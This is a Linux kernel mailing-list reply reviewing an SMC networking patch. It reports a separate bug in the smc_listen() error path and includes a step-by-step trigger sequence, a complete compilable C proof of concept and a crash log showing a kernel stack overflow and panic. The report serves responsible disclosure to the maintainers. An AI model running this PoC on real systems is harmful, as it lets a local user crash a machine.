Return-Path: <linux-rdma+bounces-22431-lists+linux-rdma=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-rdma@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id fjN2GkBiOmqe7gcAu9opvQ
	(envelope-from <linux-rdma+bounces-22431-lists+linux-rdma=lfdr.de@vger.kernel.org>)
	for <lists+linux-rdma@lfdr.de>; Tue, 23 Jun 2026 12:38:56 +0200
X-Original-To: lists+linux-rdma@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id 057476B653E
	for <lists+linux-rdma@lfdr.de>; Tue, 23 Jun 2026 12:38:56 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=qq.com header.s=s201512 header.b=XDUMjlcf;
	spf=pass (mail.lfdr.de: domain of "linux-rdma+bounces-22431-lists+linux-rdma=lfdr.de@vger.kernel.org" designates 172.234.253.10 as permitted sender) smtp.mailfrom="linux-rdma+bounces-22431-lists+linux-rdma=lfdr.de@vger.kernel.org";
	dmarc=pass (policy=quarantine) header.from=qq.com;
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 8A3143070D33
	for <lists+linux-rdma@lfdr.de>; Tue, 23 Jun 2026 10:38:46 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id AA5FE3CFF51;
	Tue, 23 Jun 2026 10:38:44 +0000 (UTC)
X-Original-To: linux-rdma@vger.kernel.org
Received: from xmbghk7.mail.qq.com (xmbghk7.mail.qq.com [43.163.128.53])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DFC8836EA82;
	Tue, 23 Jun 2026 10:38:39 +0000 (UTC)
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782211124; cv=none; b=iU01o9v+u7cFaDIADPjwa7EAC+9ZnsdBSNx6SZQqqNYvSFB5zUq8sSjkdxQMpW5OZPQgIUmaugR0DjKGr6XMQGgArdfiQTDfHz3PWK8IyvBVbHfDJxMto7JUEtg7E6K4xrIFUHV1ldD5TKKfbom0qEQSFsZmkxgVdTl4UkJDcBQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782211124; c=relaxed/simple;
	bh=GjVvOsU1Va32xs+5yyrI198u+sBt/gwYvnYnzDA2i9s=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=pIz9hFqdpu88/DeZ8A2SOJwNWmyFjFDsGWqkMb1cFCDCcrpvFcPjJFgaFHVAgHl6gganHG/2r4qC1efNp/fuGmg86g8kkJvdgCwjAYFcFDhNiwtKsT3Pyh+3g+RflImgeeugTIRydEl/vhbP+9k7T0Q9y44KMYN/bMVtc53aanw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=XDUMjlcf; arc=none smtp.client-ip=43.163.128.53
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782211111; bh=xs46AWO9ZCWqHrnYArh0ceLaWQWFpRk9OCdge+m5N2w=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=XDUMjlcf60Tr9hYAqOlfcsrEDry44OFregDl4+NyW1KsiTMSCMpoVJPMRS81V+Hfj
	 w4IMx/rWC7s7G3BpJqGEVZtvxwKr1aAR6Awa94s3h6OxYCizbzWJOnRtRKlxvijJnQ
	 O1P53m5BzKby2j0+DjLme4pdWsHKVd80bxospmLo=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrszb43-0.qq.com (NewEsmtp) with SMTP
	id 99B3682F; Tue, 23 Jun 2026 18:38:27 +0800
X-QQ-mid: xmsmtpt1782211107tosv0a42y
Message-ID: <tencent_BD4B709F8D16281265EDBC0DC9EFC8758808@qq.com>
X-QQ-XMAILINFO: NT7uTz3cNku2ya/XYiruYxjttnMLwzQWGrp3TXLfKnJRmYyas7J9vADMeBHY9Z
	 vzA+6hfltpg13f6OYroTrrcSasXfXPhPXg11hAgoQhj1nHFGiHkaftrbfUSyIZ/7tnISZ+m/voBm
	 j0EYQj9TeLu/Td0yAb4OpgBVRJsuanypwVmxHSUThIq5zDrx7roNICWxnKycTHbqjVMeimUwJ3pV
	 J+czxbjINpo/FLuu4uZUMWcJeD+9PqNsFq+BFV/Y0sg5r/EZqSwhf0ulC3rugKEhcfdVjXpu8mTQ
	 0lOt91Y/BtMSIi0mxEBCXnGn0zBvvJilnKJTLsC8jMrID9/lOwKsPkOcHyz4ei24PU8bfrkjuAU+
	 qvL26gJUxmYXUyoxgn+1SEZJo1GXEf8byTxlKm2qP8eqKtB+ARgZIdUa9UxIhQ0C13h6axo06f+m
	 ZEXkg/f8EHGlCk2sEfUs8LBMO8zV3HoXPS7Tz3bKnwXKsaBaSo4jiHZqU+7cu3PdtM3Ia86OyrzH
	 70EK9qzT/2g9Qk4V3qk64KOcf7sig3mNWlTd+y5UReRs7NsPB0u7b/qwv0G8K8y6BVyuFFZvYPxT
	 Vhm0UQ8OfCyeuWxt9tN2wt3EQNZrQcZLgIY29vsIMFWUiIcAO1KV571DwBhPHTRekHPI1t8G4ZzJ
	 ZwH0gdKO4vJwdEhhI934kiJSiZdzbnFjNwWvLUMjpV3dJUV5tY5GtFUdhiXEgC0zHd1P6EtAelKx
	 k22SPpeFy5hnBH+pyTsG6JLWcowe3poy50NhW/x5awKoW3UpYI//tzbitiBfVxzGHovGslC61GCZ
	 gpLQpT3+hmgNYfaDCyJgIG9qbxwTXoIlwOGL1TfxYWXoC9k6SHWinJWdUSmOAg/iO2wZ1HAM3/Lf
	 FVZvR0oF3HnU7IpSPe6hK5o5BqkOTlb9o/RCT/AkZ9S5ltEYX/VwLwFziQNdKyG1L4CC0SLN0V8W
	 AU82NL49xYn7ah7H/dNJIh4EFRDuDJX4h/Q6ppef13fTznyg7MjrO969oJd4C+Xzn6pZB+FW79Cc
	 4rN/NlalS4RhDLf9G7tHuyTvLmLUDrUnCBl3fi7iHphFKcTjm+DB8UMTG9emX9/puc3hesJmQCTb
	 uI0TpJ0m5vGQ7Ur9s=
X-QQ-XMRINFO: OWPUhxQsoeAVwkVaQIEGSKwwgKCxK/fD5g==
X-OQ-MSGID: <360fe8a0-3a98-4010-83f3-3fc5d4062a3c@qq.com>
Date: Tue, 23 Jun 2026 18:38:26 +0800
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH net v2] net/smc: avoid recursive sk_callback_lock in
 listen data_ready
To: Runyu Xiao <runyu.xiao@seu.edu.cn>, "D. Wythe"
 <alibuda@linux.alibaba.com>, Dust Li <dust.li@linux.alibaba.com>,
 Sidraya Jayagond <sidraya@linux.ibm.com>, Wenjia Zhang
 <wenjia@linux.ibm.com>, "David S. Miller" <davem@davemloft.net>,
 Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
 Paolo Abeni <pabeni@redhat.com>
Cc: Mahanta Jambigi <mjambigi@linux.ibm.com>,
 Tony Lu <tonylu@linux.alibaba.com>, Wen Gu <guwen@linux.alibaba.com>,
 Simon Horman <horms@kernel.org>, Karsten Graul <kgraul@linux.ibm.com>,
 linux-rdma@vger.kernel.org, linux-s390@vger.kernel.org,
 netdev@vger.kernel.org, linux-kernel@vger.kernel.org, jianhao.xu@seu.edu.cn,
 stable@vger.kernel.org
References: <20260617152855.1039151-1-runyu.xiao@seu.edu.cn>
 <20260619054815.176764-1-runyu.xiao@seu.edu.cn>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260619054815.176764-1-runyu.xiao@seu.edu.cn>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[qq.com,quarantine];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	R_DKIM_ALLOW(-0.20)[qq.com:s=s201512];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	FORGED_RECIPIENTS(0.00)[m:runyu.xiao@seu.edu.cn,m:alibuda@linux.alibaba.com,m:dust.li@linux.alibaba.com,m:sidraya@linux.ibm.com,m:wenjia@linux.ibm.com,m:davem@davemloft.net,m:edumazet@google.com,m:kuba@kernel.org,m:pabeni@redhat.com,m:mjambigi@linux.ibm.com,m:tonylu@linux.alibaba.com,m:guwen@linux.alibaba.com,m:horms@kernel.org,m:kgraul@linux.ibm.com,m:linux-rdma@vger.kernel.org,m:linux-s390@vger.kernel.org,m:netdev@vger.kernel.org,m:linux-kernel@vger.kernel.org,m:jianhao.xu@seu.edu.cn,m:stable@vger.kernel.org,s:lists@lfdr.de];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_SENDER_MAILLIST(0.00)[];
	TAGGED_FROM(0.00)[bounces-22431-lists,linux-rdma=lfdr.de];
	FREEMAIL_FROM(0.00)[qq.com];
	FORGED_SENDER(0.00)[xiaowu.417@qq.com,linux-rdma@vger.kernel.org];
	RCPT_COUNT_TWELVE(0.00)[20];
	FORWARDED(0.00)[lists@lfdr.de];
	MIME_TRACE(0.00)[0:+];
	FORGED_MUA_MAILLIST(0.00)[];
	FROM_HAS_DN(0.00)[];
	TO_DN_SOME(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	ALIAS_RESOLVED(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xiaowu.417@qq.com,linux-rdma@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	MID_RHS_MATCH_FROM(0.00)[];
	TAGGED_RCPT(0.00)[linux-rdma];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	DKIM_TRACE(0.00)[qq.com:+];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	DBL_BLOCKED_OPENRESOLVER(0.00)[vger.kernel.org:from_smtp,sea.lore.kernel.org:rdns,sea.lore.kernel.org:helo,sashiko.dev:url,qq.com:dkim,qq.com:mid,qq.com:from_mime]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: 057476B653E

Hi Runyu,

Thanks for this patch.

 > diff --git a/net/smc/af_smc.c b/net/smc/af_smc.c
 > index 6421c2e1c84d..1af4e3c333ff 100644
 > --- a/net/smc/af_smc.c
 > +++ b/net/smc/af_smc.c
 > @@ -2631,6 +2631,9 @@ static void smc_clcsock_data_ready(struct sock 
*listen_clcsock)
 >  {
 >      struct smc_sock *lsmc;
 >
 > +    if (READ_ONCE(listen_clcsock->sk_state) != TCP_LISTEN)
 > +        return;
 > +
 >      read_lock_bh(&listen_clcsock->sk_callback_lock);
 >      lsmc = smc_clcsock_user_data(listen_clcsock);

The TCP_LISTEN check before taking sk_callback_lock looks correct and
mirrors the same pattern from nvmet TCP.

Sashiko AI review also looked at this patch and flagged a separate
pre-existing issue nearby — the error path in smc_listen() does not
restore icsk_af_ops when kernel_listen() fails:

https://sashiko.dev/#/patchset/20260617152855.1039151-1-runyu.xiao@seu.edu.cn

The relevant code in smc_listen() (net/smc/af_smc.c, lines ~2687-2704):

         smc->ori_af_ops = inet_csk(smc->clcsock->sk)->icsk_af_ops;

         smc->af_ops = *smc->ori_af_ops;
         smc->af_ops.syn_recv_sock = smc_tcp_syn_recv_sock;

         inet_csk(smc->clcsock->sk)->icsk_af_ops = &smc->af_ops;

         if (smc->limit_smc_hs)
                 tcp_sk(smc->clcsock->sk)->smc_hs_congested = 
smc_hs_congested;

         rc = kernel_listen(smc->clcsock, backlog);
         if (rc) {
write_lock_bh(&smc->clcsock->sk->sk_callback_lock);
smc_clcsock_restore_cb(&smc->clcsock->sk->sk_data_ready,
  &smc->clcsk_data_ready);
                 rcu_assign_sk_user_data(smc->clcsock->sk, NULL);
write_unlock_bh(&smc->clcsock->sk->sk_callback_lock);
                 goto out;
         }

The error path restores sk_data_ready and sk_user_data but leaves
icsk_af_ops pointing to &smc->af_ops (whose syn_recv_sock is already
set to smc_tcp_syn_recv_sock).  I verified this in a QEMU VM and can
confirm it triggers a real kernel stack overflow.

=== Reproduction ===

Kernel: 7.1.0-rc7-gfa471042f07a #1 SMP PREEMPT_DYNAMIC x86_64
Config: ci-qemu-upstream.config (KASAN=y, CONFIG_SMC=y, DEBUG_LIST=y)
QEMU: qemu-system-x86_64 -m 2G -smp 2

Trigger sequence:
   1. SMC socket A: setsockopt(SO_REUSEADDR), bind to port P
      → clcsock gets SO_REUSEADDR via smc_bind() copy
   2. TCP socket C: setsockopt(SO_REUSEADDR), bind + listen on port P
      → Both non-TCP_LISTEN at bind time → bind OK
      → C enters TCP_LISTEN after its listen()
   3. listen(A) on SMC → kernel_listen() fails with EADDRINUSE
      → icsk_af_ops NOT restored → clcsock points to wrapper
   4. Close TCP C (free port), listen(A) again → succeeds
      → ori_af_ops now points to wrapper with syn_recv_sock = 
smc_tcp_syn_recv_sock
   5. TCP connect() to port P → smc_tcp_syn_recv_sock calls itself
      → infinite recursion → IRQ stack guard page hit → kernel panic

=== Full PoC ===

Compile with: gcc -o poc poc.c -static

// PoC: Stack overflow via corrupted icsk_af_ops in smc_listen error path
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#ifndef PF_SMC
#define PF_SMC 43
#endif
#ifndef SMCPROTO_SMC
#define SMCPROTO_SMC 0
#endif

int main(void)
{
     int smc_a, tcp_c, client;
     struct sockaddr_in addr;
     pid_t child;
     int status, ret;
     socklen_t len;
     int val;

     printf("=== SMC listen error path -> stack overflow PoC ===\n\n");

     /* Step 1: SMC socket A with SO_REUSEADDR, bind to any free port */
     printf("[1] Create SMC socket A with SO_REUSEADDR\n");
     smc_a = socket(PF_SMC, SOCK_STREAM, 0);
     if (smc_a < 0) { perror("smc socket"); return 1; }
     val = 1;
     setsockopt(smc_a, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));

     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
     addr.sin_port = 0;
     if (bind(smc_a, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         perror("bind smc_a"); close(smc_a); return 1;
     }
     len = sizeof(addr);
     if (getsockname(smc_a, (struct sockaddr *)&addr, &len) < 0) {
         perror("getsockname"); close(smc_a); return 1;
     }
     int port = ntohs(addr.sin_port);
     printf("  SMC A bound to port %d\n", port);

     /* Step 2: TCP socket C with SO_REUSEADDR, bind+listen on same port */
     printf("[2] TCP C with SO_REUSEADDR, bind+listen on port %d\n", port);
     tcp_c = socket(AF_INET, SOCK_STREAM, 0);
     val = 1;
     setsockopt(tcp_c, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
     addr.sin_port = htons(port);
     if (bind(tcp_c, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         perror("bind tcp_c"); close(tcp_c); close(smc_a); return 1;
     }
     if (listen(tcp_c, 5) < 0) {
         perror("listen tcp_c"); close(tcp_c); close(smc_a); return 1;
     }
     printf("  TCP C listening on port %d\n", port);

     /* Step 3: listen(A) should FAIL → icsk_af_ops NOT restored */
     printf("[3] listen(SMC A) — expect failure... ");
     fflush(stdout);
     ret = listen(smc_a, 5);
     if (ret == 0) {
         printf("succeeded! Unexpected.\n");
         close(tcp_c); close(smc_a);
         return 1;
     }
     printf("failed: %s\n", strerror(errno));

     /* Step 4: Close TCP C to free the port */
     printf("[4] Close TCP C to free port %d\n", port);
     close(tcp_c);
     sleep(1);

     /* Step 5: listen(A) again → succeeds but ori_af_ops is 
self-referential */
     printf("[5] listen(SMC A) again... ");
     fflush(stdout);
     ret = listen(smc_a, 5);
     if (ret < 0) {
         printf("failed: %s, retrying...\n", strerror(errno));
         sleep(2);
         ret = listen(smc_a, 5);
     }
     if (ret < 0) {
         perror("retry"); close(smc_a); return 1;
     }
     printf("succeeded! ori_af_ops->syn_recv_sock == 
smc_tcp_syn_recv_sock\n");

     /* Step 6: TCP connect → smc_tcp_syn_recv_sock recursion → STACK 
OVERFLOW */
     printf("[6] TCP connect → triggers infinite recursion...\n");
     fflush(stdout);

     child = fork();
     if (child == 0) {
         client = socket(AF_INET, SOCK_STREAM, 0);
         if (client < 0) exit(1);
         memset(&addr, 0, sizeof(addr));
         addr.sin_family = AF_INET;
         addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
         addr.sin_port = htons(port);
         if (connect(client, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
             perror("connect");
             exit(1);
         }
         sleep(3);
         close(client);
         exit(0);
     }

     printf("Waiting for crash...\n");
     sleep(5);
     if (waitpid(child, &status, WNOHANG) == 0) {
         printf("Child still alive — check dmesg\n");
         kill(child, SIGKILL);
         waitpid(child, NULL, 0);
     }
     close(smc_a);
     return 0;
}

=== Crash Log ===

Linux syzkaller 7.1.0-rc7-gfa471042f07a #1 SMP PREEMPT_DYNAMIC x86_64
(CONFIG_KASAN=y, CONFIG_SMC=y, CONFIG_DEBUG_LIST=y)

[ 1453.562682][    C0] BUG: IRQ stack guard page was hit at 
ffffc8ffffffff98 (stack is ffffc90000000000..ffffc90000008000)
[ 1453.562712][    C0] Oops: stack guard page: 0000 [#1] SMP KASAN NOPTI
[ 1453.562733][    C0] CPU: 0 UID: 0 PID: 10840 Comm: poc Not tainted 
7.1.0-rc7-gfa471042f07a #1 PREEMPT(full)
[ 1453.562756][    C0] Hardware name: QEMU Standard PC (Q35 + ICH9, 
2009), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1453.562767][    C0] RIP: 0010:__lock_acquire+0x417/0x2730
[ 1453.562965][    C0] Call Trace:
[ 1453.562970][    C0]  <IRQ>
[ 1453.562980][    C0]  lock_acquire+0x1ae/0x360
[ 1453.562995][    C0]  ? smc_tcp_syn_recv_sock+0xab/0xb10
[ 1453.563031][    C0]  smc_tcp_syn_recv_sock+0xbf/0xb10
[ 1453.563051][    C0]  ? smc_tcp_syn_recv_sock+0xab/0xb10
[ 1453.563073][    C0]  ? __pfx_smc_tcp_syn_recv_sock+0x10/0x10
[ 1453.563114][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
[ 1453.563158][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
[ 1453.563200][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
[ 1453.563244][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
                         [... 15+ recursive frames ...]
[ 1453.564373][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
[ 1453.564413][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
[ 1453.577027][    C0] RIP: 0033:0x423574
[ 1453.577319][    C0] Kernel panic - not syncing: Fatal exception in 
interrupt

The infinite recursion is visible in the repeated
smc_tcp_syn_recv_sock+0x435/0xb10 frames — each iteration calls
ori_af_ops->syn_recv_sock(), which is itself, pushing a new frame
until the IRQ stack guard page is hit.

Thanks,
Xiao



